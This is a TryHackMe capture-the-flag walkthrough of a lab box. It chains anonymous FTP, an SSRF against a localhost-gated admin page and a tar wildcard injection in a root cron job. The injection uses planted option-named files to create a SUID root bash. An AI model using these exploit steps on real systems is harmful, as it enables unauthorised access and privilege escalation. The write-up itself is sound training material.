# Operation Cold — TryHackMe

**Platform:** TryHackMe · **Difficulty:** Easy · **Date:** 2026-11-18

## Summary
A "rotted staging server" for Volt Labs. Anonymous FTP leaks the web app's source backup, which reveals a URL Preview Service with a weak SSRF filter. Abusing the SSRF to hit the app's own localhost-gated admin endpoint leaks staging SSH credentials. From the SSH shell, a root cron job running `tar *` in a user-writable directory is exploited with a tar wildcard injection to pop a root shell.

## Enumeration
Full port sweep, then service/script scan on what's open:
```
nmap -p- --min-rate 2000 -T4 TARGET
nmap -sV -sC -p21,22,80 --script ftp-anon TARGET
```
Three ports: **21 FTP** (vsftpd 3.0.5, anonymous allowed), **22 SSH**, **80 HTTP** (Gunicorn — a Python/WSGI app).

Anonymous FTP has a `pub/` dir holding a backup. Pull and unpack it:
```
wget ftp://anonymous:anonymous@TARGET/pub/backup.tar.gz
tar xzf backup.tar.gz   # -> app.py (the Preview Service source)
```
The web app is a **URL Preview Service**: `/preview?url=` fetches whatever URL you hand it. Textbook SSRF surface.

## Foothold — SSRF to the admin endpoint
Reading `app.py`:
- `/preview?url=` only checks the **hostname** equals `kestrel.thm` (which resolves to `127.0.0.1` on the box). No scheme or path restriction.
- `/admin/notes` is gated purely on `remote_addr` being localhost, and it reads an admin notes file.

So make the server SSRF to **its own** admin page — the request originates from 127.0.0.1, so the localhost gate passes:
```
curl "http://TARGET/preview?url=http://kestrel.thm/admin/notes"
```
This leaks staging SSH creds (`webdev : REDACTED`). SSH in and read the user flag:
```
ssh webdev@TARGET
cat ~/user.txt
```

## Privilege escalation — tar wildcard injection
Enumeration finds a custom cron, dated the day the box was built:
```
cat /etc/cron.d/voltlabs-backup
# * * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```
It runs **as root every minute**, and `/opt/backups` is **writable by webdev**. The unquoted `*` is the hole — tar will treat filenames that look like options as options. Plant a payload plus two option-named files:
```
cd /opt/backups
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod 4777 /tmp/rootbash' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```
Wait ~60s for the cron to fire, then drop into the SUID root bash:
```
/tmp/rootbash -p   # euid=0(root)
```
**Gotcha:** the root flag is at `/root/flag.txt`, not `/root/root.txt`:
```
cat /root/flag.txt
```

## Flags / Answers
- user.txt: `THM{REDACTED}`
- root flag (`/root/flag.txt`): `THM{REDACTED}`

## Lessons
- Anonymous FTP leaking a source backup is a gift — read the code and you beat filters precisely instead of guessing at them.
- An SSRF allow-list that only checks the hostname is no allow-list: if the trusted name resolves to localhost, you can reach any localhost-gated endpoint on the box.
- Any root cron running `tar *` (or `chown *`, `rsync`) in a writable directory is a wildcard-injection privesc — plant option-named files and let root's command run your payload.
- When a flag isn't where you expect (`root.txt`), stop and search as root (`find / -name 'flag*' 2>/dev/null`) rather than assuming you failed.
